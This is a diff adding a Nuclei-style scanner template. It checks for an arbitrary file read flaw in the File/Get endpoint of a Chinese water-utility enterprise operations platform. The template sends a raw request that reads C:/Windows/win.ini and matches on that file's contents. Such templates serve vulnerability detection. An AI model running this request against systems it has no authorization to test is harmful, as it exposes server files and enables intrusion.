@@ -1,0 +1,23 @@
+id: senxinju-Get-File-reading
+
+info:
+  name: 森鑫炬水务企业综合运营平台 File/Get 任意文件读取漏洞
+  author: senxinju
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /Data/File/Get?path=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+        condition: and
+      - type: status
+        status: 
+          - 200
